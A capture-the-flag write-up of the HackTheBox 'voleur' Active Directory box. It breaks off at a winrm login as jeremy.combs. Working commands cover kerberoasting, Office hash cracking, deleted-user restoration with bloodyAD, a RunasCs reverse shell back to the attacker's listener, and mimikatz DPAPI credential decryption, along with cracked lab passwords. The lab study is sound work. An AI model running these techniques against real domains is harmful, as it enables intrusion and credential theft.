---
title: HackTheBox - voleur writeup (windows/Medium)
categories: [HackTheBox]
tags: [HackTheBox, voleur, nmap, AD, nxc, nxc-spider, NTLM, disabled-NTLM-auth, kerberos, kerberos-authentication, ntp, ntpdate, bloodhound, bloodhound-python, office2john, office2john.py, john, ldap, smb, winrm, evil-winrm, REMOTE MANAGEMENT GROUPREMOTE MANAGEMENT GROUP, krb5.conf, TGT, impacket, getTGT, kerberos-realm, bloodyAD, powershell, 1.2.840.113556.1.4.2064, RunasCs, dpapi, dpapi-masterkey, mimikatz, mimikatz-dpapi-cache, mimikatz-dpapi-cred, rpc, ssh, windows-registry, SECURITY-registry-hive, SYSTEM-registry-hive, pypykatz, ntds]
render_with_liquid: false
---

 `voleur` is an assume-breach medium windows box running active directory services with ntlm auth disabled as well as a linux instance running on wsl, where I was given the credentials of `ryan.naylor`, I found an encrypted file in the `IT` share with user credentials, from there I used them to abuse `DACL` mis-configuations to get `svc_winrm` and generated a custom `krb5.conf` file to get the user flag, for the root part, I restored a `todd.wolfe` and decrypted their `DPAPI` blobs to find `jeremy.combs` credentials, which gave me access to an ssh private key, I used it to login to the `linux` instance then extracted and parsed registry hives from the domain controller backup, which gave me `Administrator` ntlm hash
## Recon

I ran `nmap` to find that the machine is a domain controller running active directory services with the domain being `voleur.htb`, so far so typical windows domain controller scan results, other than the fact that port `2222` is running `ssh` in what appears to be `ubuntu` with a usual windows `TTL` which is definitely not something typical for a windows box
```bash
# Nmap 7.97 scan initiated Sat Nov  1 23:06:38 2025 as: nmap -sSCV -sS -A -vv -oN voleur 10.10.11.76
Nmap scan report for 10.10.11.76 (10.10.11.76)
Host is up, received echo-reply ttl 127 (0.19s latency).
Scanned at 2025-11-01 23:06:39 +01 for 102s
Not shown: 987 filtered tcp ports (no-response)
PORT     STATE SERVICE       REASON          VERSION
53/tcp   open  domain        syn-ack ttl 127 Simple DNS Plus
88/tcp   open  kerberos-sec  syn-ack ttl 127 Microsoft Windows Kerberos (server time: 2025-11-02 06:06:56Z)
135/tcp  open  msrpc         syn-ack ttl 127 Microsoft Windows RPC
139/tcp  open  netbios-ssn   syn-ack ttl 127 Microsoft Windows netbios-ssn
389/tcp  open  ldap          syn-ack ttl 127 Microsoft Windows Active Directory LDAP (Domain: voleur.htb0., Site: Default-First-Site-Name)
445/tcp  open  microsoft-ds? syn-ack ttl 127
464/tcp  open  kpasswd5?     syn-ack ttl 127
593/tcp  open  ncacn_http    syn-ack ttl 127 Microsoft Windows RPC over HTTP 1.0
636/tcp  open  tcpwrapped    syn-ack ttl 127
2222/tcp open  ssh           syn-ack ttl 127 OpenSSH 8.2p1 Ubuntu 4ubuntu0.11 (Ubuntu Linux; protocol 2.0)
...
3268/tcp open  ldap          syn-ack ttl 127 Microsoft Windows Active Directory LDAP (Domain: voleur.htb0., Site: Default-First-Site-Name)
3269/tcp open  tcpwrapped    syn-ack ttl 127
5985/tcp open  http          syn-ack ttl 127 Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
|_http-title: Not Found
|_http-server-header: Microsoft-HTTPAPI/2.0

Host script results:
| smb2-security-mode: 
|   3.1.1: 
|_    Message signing enabled and required
| smb2-time: 
|   date: 2025-11-02T06:07:35
|_  start_date: N/A
|_clock-skew: 7h59m56s
| p2p-conficker: 
|   Checking for Conficker.C or higher...
|   Check 1 (port 48495/tcp): CLEAN (Timeout)
|   Check 2 (port 30079/tcp): CLEAN (Timeout)
|   Check 3 (port 60782/udp): CLEAN (Timeout)
|   Check 4 (port 62093/udp): CLEAN (Timeout)
|_  0/4 checks are positive: Host is CLEAN or ports are blocked

TRACEROUTE (using port 53/tcp)
HOP RTT       ADDRESS
1   188.96 ms 10.10.14.1 (10.10.14.1)
2   188.90 ms 10.10.11.76 (10.10.11.76)

Read data files from: /usr/bin/../share/nmap
OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
# Nmap done at Sat Nov  1 23:08:21 2025 -- 1 IP address (1 host up) scanned in 103.03 seconds
```

I used `nxc` to generate the hosts file
```bash
$ nxc smb 10.10.11.76 --generate-hosts-file hosts
SMB         10.10.11.76     445    DC               [*]  x64 (name:DC) (domain:voleur.htb) (signing:True) (SMBv1:False) (NTLM:False)
```

which generated the following line
```bash
10.10.11.76     DC.voleur.htb voleur.htb DC
```

I also noted that `NTLM` authentication was disabled, which meant that the box is going to be a huge pain in the ass (more on this later), or at least it was for me as this was my first box with the said disabled mechanism so far


first thing I did was to try the credentials with `nxc` but I was getting `STATUS_NOT_SUPPORTED` due to disabled `NTLM` authentication, until I added `-k` instructing `nxc` to use `kerberos` authentication instead

``` bash
$ nxc ldap 10.10.11.76 -u ryan.naylor -p HollowOct31Nyt
LDAP        10.10.11.76     389    DC               [*] None (name:DC) (domain:voleur.htb) (signing:None) (channel binding:No TLS cert) (NTLM:False)
LDAP        10.10.11.76     389    DC               [-] voleur.htb\ryan.naylor:HollowOct31Nyt STATUS_NOT_SUPPORTED
```

since I was going be interacting a lot with `kerberos` I went ahead and disabled automatic time update with `ntp` and sync'd my time with the machine first

```bash
$ sudo timedatectl set-ntp false
$ sudo ntpdate voleur.htb
```

and tried the credentials again, this time they worked
```bash
$ nxc ldap 10.10.11.76 -u ryan.naylor -p HollowOct31Nyt -k
LDAP        10.10.11.76     389    DC               [*] None (name:DC) (domain:voleur.htb) (signing:None) (channel binding:No TLS cert) (NTLM:False)
LDAP        10.10.11.76     389    DC               [+] voleur.htb\ryan.naylor:HollowOct31Nyt
```

## user.txt

I used `bloodhound-python` (don't forget the `-k` flag xd) but I didn't get anything interesting, next thing I did was to check the shares

now this is where most tools began to break, or at least I didn't know how to get them to work, for instance I usually use `smbclient` to for the job in hand, but after some time googling around and trying few commands combinations I still failed to get it to work with `kerberos` authentication
```bash
$ smbclient -U ryan.naylor%HollowOct31Nytr --use-kerberos=required -L \\\\voleur.htb\\ -I 10.10.11.76
gensec_spnego_client_negTokenInit_step: Could not find a suitable mechtype in NEG_TOKEN_INIT
session setup failed: NT_STATUS_INVALID_PARAMETER
```

luckily `nxc` worked with `kerberos` authentication and it has modules to do almost anything other tools can, most of the time it's less efficient and more noisy output though, but hey if it works it works

so finally I used `nxc`'s `spider` module to get a list of the shares and their content, and found a readable `IT` share
```bash

$ grep spider_plus path -A 20
$ nxc smb 10.10.11.76 -d voleur.htb -u ryan.naylor -p HollowOct31Nyt -k --shares -M spider_plus
[-] Failed loading module at /tmp/_MEI2HpImr/nxc/modules/lockscreendoors.py: No module named 'pefile'
SMB         10.10.11.76     445    DC               [*]  x64 (name:DC) (domain:voleur.htb) (signing:True) (SMBv1:False) (NTLM:False)
SMB         10.10.11.76     445    DC               [+] voleur.htb\ryan.naylor:HollowOct31Nyt
SPIDER_PLUS 10.10.11.76     445    DC               [*] Started module spidering_plus with the following options:
SPIDER_PLUS 10.10.11.76     445    DC               [*]  DOWNLOAD_FLAG: False
SPIDER_PLUS 10.10.11.76     445    DC               [*]     STATS_FLAG: True
SPIDER_PLUS 10.10.11.76     445    DC               [*] EXCLUDE_FILTER: ['print$', 'ipc$']
SPIDER_PLUS 10.10.11.76     445    DC               [*]   EXCLUDE_EXTS: ['ico', 'lnk']
SPIDER_PLUS 10.10.11.76     445    DC               [*]  MAX_FILE_SIZE: 50 KB
SPIDER_PLUS 10.10.11.76     445    DC               [*]  OUTPUT_FOLDER: /home/jeff/.nxc/modules/nxc_spider_plus
SMB         10.10.11.76     445    DC               [*] Enumerated shares
SMB         10.10.11.76     445    DC               Share           Permissions     Remark
SMB         10.10.11.76     445    DC               -----           -----------     ------
SMB         10.10.11.76     445    DC               ADMIN$                          Remote Admin
SMB         10.10.11.76     445    DC               C$                              Default share
SMB         10.10.11.76     445    DC               Finance
SMB         10.10.11.76     445    DC               HR
SMB         10.10.11.76     445    DC               IPC$            READ            Remote IPC
SMB         10.10.11.76     445    DC               IT              READ
SMB         10.10.11.76     445    DC               NETLOGON        READ            Logon server share
SMB         10.10.11.76     445    DC               SYSVOL          READ            Logon server share
SPIDER_PLUS 10.10.11.76     445    DC               [+] Saved share-file metadata to "/home/jeff/.nxc/modules/nxc_spider_plus/10.10.11.76.json".
SPIDER_PLUS 10.10.11.76     445    DC               [*] SMB Shares:           8 (ADMIN$, C$, Finance, HR, IPC$, IT, NETLOGON, SYSVOL)
SPIDER_PLUS 10.10.11.76     445    DC               [*] SMB Readable Shares:  4 (IPC$, IT, NETLOGON, SYSVOL)
SPIDER_PLUS 10.10.11.76     445    DC               [*] SMB Filtered Shares:  1
SPIDER_PLUS 10.10.11.76     445    DC               [*] Total folders found:  27
SPIDER_PLUS 10.10.11.76     445    DC               [*] Total files found:    7
SPIDER_PLUS 10.10.11.76     445    DC               [*] File size average:    3.55 KB
SPIDER_PLUS 10.10.11.76     445    DC               [*] File size min:        22 B
SPIDER_PLUS 10.10.11.76     445    DC               [*] File size max:        16.5 KB

```

there was one interesting file inside the share
```
$ cat /home/jeff/.nxc/modules/nxc_spider_plus/10.10.11.76.json
{
    "IT": {
        "First-Line Support/Access_Review.xlsx": {
            "atime_epoch": "2025-01-31 10:09:27",
            "ctime_epoch": "2025-01-29 10:39:51",
            "mtime_epoch": "2025-05-29 23:23:36",
            "size": "16.5 KB"
        }
    },
...
```

I used `nxc`'s `--get-file` to download the file to my machine
```bash
$ nxc smb 10.10.11.76 -d voleur.htb -u ryan.naylor -p HollowOct31Nyt -k --get-file 'First-Line Support/Access_Review.xlsx' Access_Review.xlsx --share IT
SMB         10.10.11.76     445    DC               [*]  x64 (name:DC) (domain:voleur.htb) (signing:True) (SMBv1:False) (NTLM:False)
SMB         10.10.11.76     445    DC               [+] voleur.htb\ryan.naylor:HollowOct31Nyt
SMB         10.10.11.76     445    DC               [*] Copying "First-Line Support/Access_Review.xlsx" to "/home/jeff/htb/machines/voleur/AD_LOOT/Access_Review.xlsx"
SMB         10.10.11.76     445    DC               [+] File "First-Line Support/Access_Review.xlsx" was downloaded to "/home/jeff/htb/machines/voleur/AD_LOOT/Access_Review.xlsx"

```

found that the file was encrypted
``` bash
$ file Access_Review.xlsx
Access_Review.xlsx: CDFV2 Encrypted
```

so I used `office2john.py` to extract the hash and crack it with `john`, [once again the upstream version of `office2john.py` wasn't the latest one on github so I had to compile the latest commit from the official github repository](https://0x00jeff.github.io/posts/HackTheBox-puppy-writeup-windows-medium/#antedwards)
```bash
./john/run/office2john.py Access_Review.xlsx > access_review.hash
$ john access_review.hash --wordlist=$ROCK
Warning: detected hash type "Office", but the string is also recognized as "office-opencl"
Use the "--format=office-opencl" option to force loading these as that type instead
Using default input encoding: UTF-8
Loaded 1 password hash (Office, 2007/2010/2013 [SHA1 128/128 AVX 4x / SHA512 128/128 AVX 2x AES])
Cost 1 (MS Office version) is 2013 for all loaded hashes
Cost 2 (iteration count) is 100000 for all loaded hashes
Will run 8 OpenMP threads
Press 'q' or Ctrl-C to abort, almost any other key for status
football1        (Access_Review.xlsx)
1g 0:00:00:06 DONE (2025-09-03 09:04) 0.1650g/s 132.0p/s 132.0c/s 132.0C/s football1..martha
Use the "--show" option to display all of the cracked passwords reliably
Session completed
```

then I used [an online `xlsx` file reader](https://products.aspose.app/cells/viewer) to open the encrypted file and found the following:
![access_review_content.png](https://raw.githubusercontent.com/0x00Jeff/0x00Jeff.github.io/refs/heads/master/assets/htb/voleur/access_review_content.png)
 now I've got the following information:
 - the creds of `svc_ldap` and `svc_iis` accounts, as well as the deleted account ``Todd.Wolfe``
 - some members of the `REMOTE MANAGEMENT GROUP`, I'll likely need to pwn at least one of them in order to get the user flag
 - there is a `First-Line`, `Second-Line` and a `Third-Line TECHNICIANS` group
 - `Lacey.Miller` has possible permission over `svc_winrm` account
 - `Jeremy.Combs` has access to the `software folder` as well as possible permission over `svc_backup` account

### svc_winrm
now that I have credentials of the new accounts, I went back to bloodhound to check for exploitation paths, and found the following:
![svc_ldap_writeSPN_on_svc_winrm.png](https://raw.githubusercontent.com/0x00Jeff/0x00Jeff.github.io/refs/heads/master/assets/htb/voleur/svc_ldap_writeSPN_on_svc_winrm.png)

I started with abusing the `WriteSPN` first so I can get the user flag, first I grabbed `svc_ldap`'s `TGT` and used it to perform a targeted `kerberoast attack` on `SVC_WINRM`
```bash
$ getTGT.py -k voleur.htb/svc_ldap:M1XyC9pW7qT5Vn -k

[*] Saving ticket in svc_ldap.ccache
```

```bash
$ KRB5CCNAME=svc_ldap.ccache targetedKerberoast.py -v -d voleur.htb -u svc_ldap -k --dc-host DC.voleur.htb --request-user svc_winrm
[*] Starting kerberoast attacks
[*] Attacking user (svc_winrm)
[VERBOSE] SPN added successfully for (svc_winrm)
[+] Printing hash for (svc_winrm)
$krb5tgs$23$*svc_winrm$VOLEUR.HTB$voleur.htb/svc_winrm*$dfa93938c20ffbd5cefc400853e5972e$43216f5046e79a462476bf41e054beee79b78985f5b46a5973073f873d9279487d61d40973a28bf82d8d3f75fc9ff0ce09a5db3fa21421f454950a75c46d715b3adc2d56dae29a7885639eea5284c346c00429fe993468ab856a145c2b34068844b0baf73336619ebf538d5c2a539826c2ad5db7f767861e0bc0044ded8b8446d09f6c4a1cea8e74c792049e8c9dc4f30fd5710ee501b34033489f921177d181b2296adfa5a0d060d033d0072ba6b26bde27f31ffb9d22389911be8c082684881e7654cfd143b557ce42feb726333f962f86e07d00e0881aedf0323265dc64329f10e488ec1a19c749830f801046c60ae185fb204d4e2b8449b8ad7baadeab45b82fc070fb3f6c93bc13455bc8326be4f8502193811f438017f7a7b0d8aa3bbc5153967451252b7c2969be4095db09782459c8095ad56f82f7fc43c5817207535277703abef9fd87522f666417261d1be4ae59ecd1af07c23cbfcc7809466f7c9ffa93636d6aa84797b14a0405e05479d3b25b6a5731156deed261248e3307a4a39ee57a9fb1fd1fbde9587affd745c462551a4823a29d2e1a4ffa1e6655e28eb027e7d6b24403744b7a86942adb786a8c7dd18369bf740560c9287f1d41032c82fda6749ac3fb330c720f358e7eca2910082145417ee8e7c0a9a95888a9fd30110aae2addc0e1b5b92ed9cf321e4a73f880552b7bd2508b75ff1f1a2810c0530f1f55e256328ecbb2b4c2c7206a7126bd30aef1a4156d8c944384c7c24695d6deef94d9e1fd63be058f44a097e75ab6bf7c09b4b10416a647c7bc38ac0da1a855be111dc71babba355040e0ae072aa5ab37a8c75b87d600e796d8000dbebcfbaf6314960f1d84e819425fcf6b7f91077b77842b7b3232925387d1b0364de3a31867d6203209d7e2931548ec1304fa79b084b825d69454c368b66979d0f8152ffe72a182c572e2122ab2222fa996462bb9d037eae5b6ff7dfd799a03f107af980d69ca485ca0789184777b6ec0d4b223faf6340453937235e4396992f62e2bdb14ca2510eeb954d5afc7d3fe787147f99fddeff66ff9244e2ff07610e255068569f023d37eda2f78adbb0f79d51a9e9afc5caaa96084fcda1bbf2998b7e7edadbf92a2a2af0b52b53808bc3dd29c6b70b3178e8bed2b26ea2269c6649f8bf8e4c797fe51ac08c2cddc98ae1d8edf2ae8982711cf9b2394e090fe151e7a3db34e363a8cb10d64552407d5d4029744e23d2f5d55483570c0174bdfc80407063ae84647c2857035253f41cb8bee66b63b994ee71219678cfb0bbc811667b154e6a87bfa5c2c3a820b33ff6cfc426afa10392be095420ad34081330fb892eabf63d0b8830dbfc7d06dc101d7bc13fa1911bcfc5e768c6d6704872c3a08a51cb2c15f117e90268b0ca647797b8bf492819af5e7cc864efbe8a4fda764c1f5f1eeb2e09b9f5616de7d841ad00e1a48cbd4b959bf7194
[VERBOSE] SPN removed successfully for (svc_winrm)
```

then cracked the hash with `john`
```bash
$ john svc_winrm_tgs.hash --wordlist=$ROCK
Using default input encoding: UTF-8
Loaded 2 password hashes with 2 different salts (krb5tgs, Kerberos 5 TGS etype 23 [MD4 HMAC-MD5 RC4])
Will run 8 OpenMP threads
Press 'q' or Ctrl-C to abort, almost any other key for status
AFireInsidedeOzarctica980219afi (?)
1g 0:00:00:10 DONE (2025-09-03 09:47) 0.09891g/s 1418Kp/s 2553Kc/s 2553KC/s !)()45jlr..*7¡Vamos!
Use the "--show" option to display all of the cracked passwords reliably
Session completed
```

the password worked with `nxc` using `ldap`
```bash
$ nxc ldap voleur.htb -u svc_winrm -p AFireInsidedeOzarctica980219afi -k
LDAP        voleur.htb      389    DC               [*] None (name:DC) (domain:voleur.htb) (signing:None) (channel binding:No TLS cert) (NTLM:False)
LDAP        voleur.htb      389    DC               [+] voleur.htb\svc_winrm:AFireInsidedeOzarctica980219afi
```

but it didn't work with either `smb` or `winrm`
```bash
$ nxc smb voleur.htb -u svc_winrm -p AFireInsidedeOzarctica980219afi -k
SMB         voleur.htb      445    voleur           [*]  x64 (name:voleur) (domain:htb) (signing:True) (SMBv1:False) (NTLM:False)
SMB         voleur.htb      445    voleur           [-] htb\svc_winrm:AFireInsidedeOzarctica980219afi [Errno Connection error (10.10.11.77:88)] [Errno 111] Connection refused
```

```bash
$ nxc winrm voleur.htb -u svc_winrm -p AFireInsidedeOzarctica980219afi -k
[22:58:53] ERROR    Invalid NTLM challenge received from server. This may indicate NTLM is not supported and nxc winrm only support NTLM currently                                 winrm.py:62
WINRM       voleur.htb      5985   voleur.htb       [*] None (name:voleur.htb) (domain:None) (NTLM:False)
```

`evil-winrm` didn't work either
```bash
$ evil-winrm -i voleur.htb -u svc_winrm -p AFireInsidedeOzarctica980219afi

Info: Establishing connection to remote endpoint

Error: An error of type ArgumentError happened, message is unknown type: 2061232681

Error: Exiting with code 1
```

this made no sense at first as `svc_winrm` was a member of the `REMOTE MANAGEMENT GROUP`, after some googling I found that the culprit was `disabled NTLM auth`, again

I found a [solution](https://notes.benheater.com/books/active-directory/page/kerberos-authentication-from-kali#bkmrk-create-a-custom-kerb) to get `evil-winrm` to work with `kerberos` authentication, basically what I had to do is to generate a custom `krb5.conf` file for `voleur.htb`, and use it with a `svc_winrm` `TGT`, I also learned that `kerberos` prefers host names (aka `realms` in the `kerberos` world) over `IP`s, and it uses the `DC`'s `dns server` to resolve them

the tutorial had a nice helper function automatically generate the config file from the domain `dns` and the `DC` hostname
```bash
$ customkrb5 voleur.htb DC

[+] Custom KRB5.conf file created at: custom_krb5.conf
[+] Exported environment variable: export KRB5_CONFIG=custom_krb5.conf
```

the config contained the `realm` needed by `kerberos` as well as where it can find the `DC`
```bash
$ cat custom_krb5.conf
[libdefaults]
    default_realm = VOLEUR.HTB
    dns_lookup_realm = true
    dns_lookup_kdc = true

[realms]
    VOLEUR.HTB = {
    kdc = DC.voleur.htb
    admin_server = DC.voleur.htb
    default_domain = voleur.htb
}

[domain_realm]
    voleur.htb = VOLEUR.HTB
    .voleur.htb = VOLEUR.HTB
```

I got a `TGT` for `svc_winrm` and used to along with the config file to get a `winrm` shell and grab the user flag
```bash
$ getTGT.py -k voleur.htb/svc_winrm:AFireInsidedeOzarctica980219afi -k
Impacket v0.12.0 - Copyright Fortra, LLC and its affiliated companies

[*] Saving ticket in svc_winrm.ccache
```

```bash
$ KRB5_CONFIG=custom_krb5.conf KRB5CCNAME=svc_winrm.ccache evil-winrm -i dc.voleur.htb -r voleur.htb

Info: Establishing connection to remote endpoint

*Evil-WinRM* PS C:\Users\svc_winrm\Documents> more ../Desktop/user.txt
08****************************e0
```

## root.txt

### restoring todd.wolfe

looking back at `svc_ldap` account in bloodhound, I could see that it's a member of the `RESTORE USERS` group which has `GenericWrite` on `SECOND-LINE SUPPORT TECHNICIANS` organisation unit , from the encrypted note we found earlier I already knew there is a deleted `todd.wolfe` account but I needed to get more info about it, I used `bloodyAD` to get the job done
```bash
$ bloodyAD -k --host DC.voleur.htb -d voleur.htb -u svc_ldap -p M1XyC9pW7qT5Vn get writable --include-del

distinguishedName: CN=S-1-5-11,CN=ForeignSecurityPrincipals,DC=voleur,DC=htb
permission: WRITE

distinguishedName: OU=Second-Line Support Technicians,DC=voleur,DC=htb
permission: CREATE_CHILD; WRITE

distinguishedName: CN=Lacey Miller,OU=Second-Line Support Technicians,DC=voleur,DC=htb
permission: CREATE_CHILD; WRITE

distinguishedName: CN=svc_ldap,OU=Service Accounts,DC=voleur,DC=htb
permission: WRITE

distinguishedName: CN=Todd Wolfe\0ADEL:1c6b1deb-c372-4cbb-87b1-15031de169db,CN=Deleted Objects,DC=voleur,DC=htb
permission: CREATE_CHILD; WRITE

distinguishedName: CN=svc_winrm,OU=Service Accounts,DC=voleur,DC=htb
permission: WRITE
```

I could see the user, along with the fact that I have both `CREATE_CHILD` and `WRITE` permissions on the user, but I wanted to get more info for learning purposes, as [per a previous writeup](https://0x00jeff.github.io/posts/HackTheBox-tombwatcher-writeup-windows-medium/#a-trick-that-made-me-get-stuck-for-about-2-days) I learnt that I need both `GenericWrite` on the deleted user and `CREATE_CHILD` on the `OU` used for restoration I could either enumerate this using `bloodyAD` with `svc_ldap` credentials or with `powershell`
### deleted user enum with bloodyAD

```bash 
$ bloodyAD -k --host DC.voleur.htb -d voleur.htb -u svc_ldap -p M1XyC9pW7qT5Vn get search -c 1.2.840.113556.1.4.2064 --filter '(isDeleted=TRUE)' --attr name,sAMAccountName,userPrincipalName,objectSid,lastKnownParent

distinguishedName: CN=Deleted Objects,DC=voleur,DC=htb
name: Deleted Objects

distinguishedName: CN=Todd Wolfe\0ADEL:1c6b1deb-c372-4cbb-87b1-15031de169db,CN=Deleted Objects,DC=voleur,DC=htb
lastKnownParent: OU=Second-Line Support Technicians,DC=voleur,DC=htb
name: Todd Wolfe
DEL:1c6b1deb-c372-4cbb-87b1-15031de169db
objectSid: S-1-5-21-3927696377-1337352550-2781715495-1110
sAMAccountName: todd.wolfe
userPrincipalName: todd.wolfe@voleur.htb
```

### deleted user enum with powershell

since `svc_ldap` isn't a member of the `REMOTE MANAGEMENT GROUP` thus can't grab a `winrm` shell with it, I uploaded [runasCS](https://github.com/antonioCoco/RunasCs) to the box and used it to execute commands as that user
```powershell
*Evil-WinRM* PS C:\programdata> ./RunasCs.exe svc_ldap M1XyC9pW7qT5Vn 'powershell Get-ADobject -filter {isDeleted -eq $true} -Properties Name,samAccountName,userPrincipalName,objectSid,ObjectGUID,LastKnownParent -IncludeDeletedObjects'
[*] Warning: The logon for user 'svc_ldap' is limited. Use the flag combination --bypass-uac and --logon-type '8' to obtain a more privileged token.



Deleted           : True
DistinguishedName : CN=Deleted Objects,DC=voleur,DC=htb
LastKnownParent   :
Name              : Deleted Objects
ObjectClass       : container
ObjectGUID        : 587cd8b4-6f6a-46d9-8bd4-8fb31d2e18d8

Deleted           : True
DistinguishedName : CN=Todd Wolfe\0ADEL:1c6b1deb-c372-4cbb-87b1-15031de169db,CN=Deleted Objects,DC=voleur,DC=htb
LastKnownParent   : OU=Second-Line Support Technicians,DC=voleur,DC=htb
Name              : Todd Wolfe
                    DEL:1c6b1deb-c372-4cbb-87b1-15031de169db
ObjectClass       : user
ObjectGUID        : 1c6b1deb-c372-4cbb-87b1-15031de169db
objectSid         : S-1-5-21-3927696377-1337352550-2781715495-1110
samAccountName    : todd.wolfe
userPrincipalName : todd.wolfe@voleur.htb
```

I found that `todd.wolfe`'s last parent is `OU=Second-Line Support Technicians,DC=voleur,DC=htb` (an `OU` which we have `GenericWrite` on) we can go ahead and restore it, again we can do this either with `bloodyAD` or `powershell`, I'll go ahead and use `bloodyAD` as it's easier

```bash
$ bloodyAD -k --host DC.voleur.htb -d voleur.htb -u svc_ldap -p M1XyC9pW7qT5Vn set restore 'todd.wolfe'
[+] todd.wolfe has been restored successfully under CN=Todd Wolfe,OU=Second-Line Support Technicians,DC=voleur,DC=htb
```

from there I checked the validity of the password I have
```bash
$ nxc ldap voleur.htb -u todd.wolfe -p NightT1meP1dg3on14 -k
LDAP        voleur.htb      389    DC               [*] None (name:DC) (domain:voleur.htb) (signing:None) (channel binding:No TLS cert) (NTLM:False)
LDAP        voleur.htb      389    DC               [+] voleur.htb\todd.wolfe:NightT1meP1dg3on14
```

then used to extract new data using `nxc` with bloodhound module
```bash
$  nxc ldap 10.10.11.76 --dns-server 10.10.11.76 -d voleur.htb -u todd.wolfe -p NightT1meP1dg3on14 -k --bloodhound -c ALL
LDAP        10.10.11.76     389    DC               [*] None (name:DC) (domain:voleur.htb) (signing:None) (channel binding:No TLS cert) (NTLM:False)
LDAP        10.10.11.76     389    DC               [+] voleur.htb\todd.wolfe:NightT1meP1dg3on14
LDAP        10.10.11.76     389    DC               Resolved collection methods: container, localadmin, objectprops, trusts, rdp, session, dcom, psremote, group, acl
LDAP        10.10.11.76     389    DC               Using kerberos auth without ccache, getting TGT
LDAP        10.10.11.76     389    DC               Done in 0M 46S
LDAP        10.10.11.76     389    DC               Compressing output into /home/jeff/.nxc/logs/DC_10.10.11.76_2025-11-03_073503_bloodhound.zip
```

checking the new result in bloodhound, I found that `todd.wolfe` was a member of `SECOND-LINE TECHNICIANS` as well as the `REMOTE MANAGEMENT GROUP` 
![todd_wolfe_groups.png](https://raw.githubusercontent.com/0x00Jeff/0x00Jeff.github.io/refs/heads/master/assets/htb/voleur/todd_wolfe_groups.png)

so I tried getting their `TGT` and using it to get a `winrm` shell but it didn't work, and honestly I have no idea why
```bash
getTGT.py -k voleur.htb/todd.wolfe:NightT1meP1dg3on14 -k

[*] Saving ticket in todd.wolfe.ccache

$ KRB5_CONFIG=custom_krb5.conf KRB5CCNAME=todd.wolfe.ccache evil-winrm -i dc.voleur.htb -r voleur.htb

Info: Establishing connection to remote endpoint

Error: An error of type GSSAPI::GssApiError happened, message is gss_init_sec_context did not return GSS_S_COMPLETE: Invalid token was supplied
Success

Error: Exiting with code 1
```

since I already had `runasCS` uploaded on the box I used to get a reverse shell as `todd.wolfe` now that I have it enabled and I have their credentials
### on the box
``` powershell
*Evil-WinRM* PS C:\programdata> ./RunasCs.exe todd.wolfe NightT1meP1dg3on14 powershell.exe -r 10.10.14.250:20000
[*] Warning: The logon for user 'todd.wolfe' is limited. Use the flag combination --bypass-uac and --logon-type '8' to obtain a more privileged token.

[+] Running in session 0 with process function CreateProcessWithLogonW()
[+] Using Station\Desktop: Service-0x0-a4e5cc$\Default
[+] Async process 'C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe' with pid 3724 created in background.
```

### on my machine
```bash
$ rlwrap nc -lnvp 20000
Connection from 10.10.11.76:62281
Windows PowerShell
Copyright (C) Microsoft Corporation. All rights reserved.

Install the latest PowerShell for new features and improvements! https://aka.ms/PSWindows

PS C:\Windows\system32> whoami
whoami
voleur\todd.wolfe
```

I found an interesting `C:\IT` with 3 folders inside
```
PS C:\IT> ls
ls

    Directory: C:\IT

Mode                 LastWriteTime         Length Name
----                 -------------         ------ ----
d-----         1/29/2025   1:40 AM                First-Line Support
d-----         1/29/2025   7:13 AM                Second-Line Support
d-----         1/30/2025   8:11 AM                Third-Line Support
```

the first user we got in the assumed breach was a part of the `First-Line Support` group, `todd.wolfe` is a member of the second group, I assume later we will need access to the third one, anyway I looked inside and found an archived user home directory with `dpapi` credentials inside

```powershell
PS C:\IT\Second-Line Support\Archived Users> ls
ls

    Directory: C:\IT\Second-Line Support\Archived Users

Mode                 LastWriteTime         Length Name
----                 -------------         ------ ----
d-----         1/29/2025   7:13 AM                todd.wolfe  

PS C:\IT\Second-Line Support\Archived Users\todd.wolfe\Appdata\Roaming\Microsoft> ls Credentials
ls Credentials


    Directory: C:\IT\Second-Line Support\Archived Users\todd.wolfe\Appdata\Roaming\Microsoft\Credentials


Mode                 LastWriteTime         Length Name
----                 -------------         ------ ----
-a----         1/29/2025   4:55 AM            398 772275FAD58525253490A9B0039791D3
         
```

### decrypting dpapi blobs

I [already showed how to exfiltrate dpapi blobs and decrypt them offline with `pypykatz` on a previous writeup](https://0x00jeff.github.io/posts/HackTheBox-puppy-writeup-windows-medium/#stephcooper_adm) so this time I uploaded `mimikatz` to the box to decrypt them, I had problems with the path containing spaces, so I ran `mimikatz` from `C:\IT\Second-Line Support\Archived Users\todd.wolfe\Appdata\Roaming\Microsoft` so I can use relative paths

first I used the tool to get the `masterkey`  with `/rpc`
```
mimikatz # dpapi::masterkey /in:.\Protect\S-1-5-21-3927696377-1337352550-2781715495-1110\08949382-134f-4c63-b93c-ce52efc0aa88 /rpc
**MASTERKEYS**
  dwVersion          : 00000002 - 2
  szGuid             : {08949382-134f-4c63-b93c-ce52efc0aa88}
  
...

[domainkey] with RPC
[DC] 'voleur.htb' will be the domain
[DC] 'DC.voleur.htb' will be the DC server
  key : d2832547d1d5e0a01ef271ede2d299248d1cb0320061fd5355fea2907f9cf879d10c9f329c77c4fd0b9bf83a9e240ce2b8a9dfb92a0d15969ccae6f550650a83
  sha1: 7417f03ca0d4d557935d96b3f1341bdbbcdbd907
```

we can check that the key was stored in the `dpapi` cache 

```powershell
mimikatz # dpapi::cache

CREDENTIALS cache
=================

MASTERKEYS cache
================
GUID:{08949382-134f-4c63-b93c-ce52efc0aa88};KeyHash:7417f03ca0d4d557935d96b3f1341bdbbcdbd907

DOMAINKEYS cache
================
```

then I used the key to decrypt the `dpapi` blob and found `jeremy.combs`'s credentials 

```powershell
mimikatz # dpapi::cred /in:Credentials\772275FAD58525253490A9B0039791D3
...

  Type           : 00000002 - 2 - domain_password
...
  UserName       : jeremy.combs
  CredentialBlob : qT3V9pLXyN7W4m
  Attributes     : 0

```

who was a member of the `THIRD-LINE TECHNICIANS` group
![jeremy_combs_groups.png](https://raw.githubusercontent.com/0x00Jeff/0x00Jeff.github.io/refs/heads/master/assets/htb/voleur/jeremy_combs_groups.png)

I got a `TGT` as `jeremy.combs` and used to get a `winrm` shell
```bash
$ getTGT.py -k voleur.htb/jeremy.combs:qT3V9pLXyN7W4m -k

[*] Saving ticket in jeremy.combs.ccache
```

```bash
$ KRB5_CONFIG=custom_krb5.conf KRB5CCNAME=jeremy.combs.ccache evil-winrm -i dc.voleur.htb -r voleur.htb
```

